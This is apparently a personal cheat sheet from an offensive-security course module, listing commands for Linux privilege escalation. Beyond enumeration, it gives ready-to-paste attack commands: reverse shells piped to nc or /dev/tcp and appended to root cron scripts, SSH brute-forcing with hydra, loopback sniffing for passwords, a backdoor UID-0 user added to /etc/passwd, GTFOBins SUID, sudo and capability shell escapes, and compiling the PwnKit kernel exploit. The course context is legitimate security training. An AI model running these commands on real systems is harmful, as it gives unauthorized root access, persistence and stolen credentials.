# Linux Privilege Escalation, Command Appendix

Part of [[COMMAND APPENDIX]]. All commands from Module 18 (Linux Privilege Escalation). Full technique walkthroughs: [[Linux Privilege Escalation]]. Decision tree: [[Linux Privilege Escalation (Decision Tree)]].

---

## Manual Enumeration Checklist

```bash
# Who am I and what groups do I belong to?
id

# Who else is on the machine?
cat /etc/passwd

# OS, kernel, architecture
hostname
cat /etc/issue
cat /etc/os-release
uname -a       # kernel version + arch
arch

# Running processes (look for root-owned scripts/custom services)
ps aux

# Network interfaces (two interfaces = pivot potential)
ip a
routel

# Open ports and connections (look for 127.0.0.1-only listeners)
ss -anp

# Firewall rules (may reveal restricted ports or misconfigured chains)
cat /etc/iptables/rules.v4

# Cron jobs (look for (root) CMD ... entries)
ls -lah /etc/cron*
crontab -l
grep "CRON" /var/log/syslog       # Ubuntu/Debian with syslog
cat /var/log/cron.log             # Kali/Debian containers

# Installed packages and versions
dpkg -l          # Debian/Ubuntu
rpm -qa          # RHEL/CentOS

# Writable directories outside home (scripts executed by higher-priv users?)
find / -writable -type d 2>/dev/null

# Writable files (look for /etc/passwd, cron scripts, service configs)
find / -writable -type f 2>/dev/null | grep -v proc

# Disks and network mounts (unmounted partitions may hold data)
cat /etc/fstab
mount
lsblk

# Loaded kernel modules (match against CVE databases if hunting driver exploits)
lsmod
/sbin/modinfo <module_name>

# SUID binaries (anything non-standard goes straight to GTFOBins)
find / -perm -u=s -type f 2>/dev/null
```

---

## Automated Enumeration

```bash
# unix-privesc-check (pre-installed on Kali: /usr/bin/unix-privesc-check)
# Transfer to target first (scp /usr/bin/unix-privesc-check user@target:~/)
./unix-privesc-check standard 2>/dev/null | grep -A 2 "WARNING"

# LinPEAS (download from https://github.com/carlospolop/PEASS-ng/releases)
chmod +x linpeas.sh
./linpeas.sh 2>/dev/null | tee linpeas_output.txt
# Red/yellow output = high confidence findings. Start there.

# LinEnum
chmod +x LinEnum.sh && ./LinEnum.sh
```

---

## Credential Hunting (Module 18.2)

```bash
# Environment variables
env

# Dotfiles / shell startup files
cat ~/.bashrc
cat ~/.bash_profile
cat ~/.bash_history
cat ~/.zshrc

# Try found credential directly against root
su - root

# Build targeted wordlist from partial credential (e.g. Lab+3 digits)
crunch 6 6 -t Lab%%% > wordlist.txt

# SSH brute-force with known username
hydra -l <user> -P wordlist.txt <target_ip> -t 4 ssh -V

# Once on another account, check sudo
sudo -l
```

---

## Service Footprint Inspection (Module 18.2.2)

```bash
# Watch process list for credentials in command args (run for 2-5 minutes)
watch -n 1 "ps -aux | grep pass"

# Sniff loopback traffic for cleartext credentials
sudo tcpdump -i lo -A | grep "pass"

# Check AppArmor status (may block tcpdump GTFOBins technique)
cat /var/log/syslog | grep apparmor  # look for apparmor="DENIED"
aa-status
```

---

## Cron Job Abuse (Module 18.3.1)

```bash
# Find cron jobs running as root
grep "CRON" /var/log/syslog | tail -30
cat /var/log/cron.log              # alternative on Kali/Debian containers

# Check the called script's permissions
ls -lah /path/to/script.sh
cat /path/to/script.sh

# Inject mkfifo reverse shell (append -- don't overwrite)
echo >> /path/to/script.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> <PORT> >/tmp/f" >> /path/to/script.sh

# Alternative: direct bash reverse shell
echo 'bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1' >> /path/to/script.sh

# Listener on Kali
nc -lnvp <PORT>
```

---

## /etc/passwd World-Writable Abuse (Module 18.3.2)

```bash
# Confirm write access
ls -lah /etc/passwd

# Generate a password hash (crypt algorithm, usable in /etc/passwd)
openssl passwd w00t

# Inject a new UID 0 user
echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to the injected user
su root2
# password: w00t
```

---

## SUID Binary Exploitation (Module 18.4.1)

```bash
# List SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Verify effective UID while a SUID binary is running
grep Uid /proc/<PID>/status
# Uid: 1000  0  0  0  (real=joe, effective=root = SUID working)

# GTFOBins SUID examples:
# find
find . -exec /bin/sh -p \; -quit

# bash
bash -p

# python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

> See https://gtfobins.github.io/ -- filter by SUID -- for the full list per binary.

---

## Linux Capabilities Exploitation (Module 18.4.1)

```bash
# Find binaries with capabilities
/usr/sbin/getcap -r / 2>/dev/null

# Target: cap_setuid+ep
# Perl (GTFOBins)
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# Python3 (GTFOBins)
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# gdb (GTFOBins)
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
```

---

## Sudo Abuse (Module 18.4.2)

```bash
# List current user's sudo permissions
sudo -l

# Check AppArmor (may block shell escapes even with valid sudo access)
cat /var/log/syslog | grep <binary>  # look for apparmor="DENIED"

# GTFOBins sudo examples (check for YOUR actual binary, not module examples):
# apt-get
sudo apt-get changelog apt   # when less pager opens: !/bin/sh

# gcc
sudo gcc -wrapper /bin/sh,-s .

# vim
sudo vim -c '!sh'

# find
sudo find / -exec /bin/sh \; -quit

# less
sudo less /etc/hosts    # then: !/bin/sh

# man
sudo man man    # then: !/bin/sh
```

> Always look up the actual allowed binary on GTFOBins, not the module example. The VM may differ.

---

## Kernel Exploit Workflow (Module 18.4.3)

```bash
# Step 1: Gather system info on target
cat /etc/issue
cat /etc/os-release
uname -r          # kernel version (e.g. 4.4.0-116-generic)
arch              # architecture (e.g. x86_64)

# Step 2: Search on Kali
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
searchsploit "linux kernel 4.4"
searchsploit -x <path/to/exploit.c> | head -30   # inspect source before using

# Step 3: Transfer to target and compile there (avoids glibc mismatch)
# On Kali:
scp exploit.c user@<TARGET>:~/

# On target:
gcc exploit.c -o exploit
./exploit

# For PwnKit (CVE-2021-4034, pkexec < 0.120, not in searchsploit):
# On Kali:
git clone https://github.com/berdav/CVE-2021-4034.git /tmp/pwnkit
scp -r /tmp/pwnkit user@<TARGET>:/tmp/pwnkit

# On target (compile natively to avoid glibc mismatch):
cd /tmp/pwnkit
gcc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
gcc -Wall cve-2021-4034.c -o cve-2021-4034-local
./cve-2021-4034-local
```

**Check binary version before searching exploits:**
```bash
pkexec --version          # target: 0.105 → PwnKit (CVE-2021-4034)
snap --version            # target: snapd < 2.37.1 → dirty_sock (CVE-2019-7304)
ntfs-3g --version         # target: 2015.3.14 → CVE-2017-0358
```

#### Tags: #LinuxPrivesc #SUID #Capabilities #CronJob #sudo #KernelExploit #etcpasswd #Module18
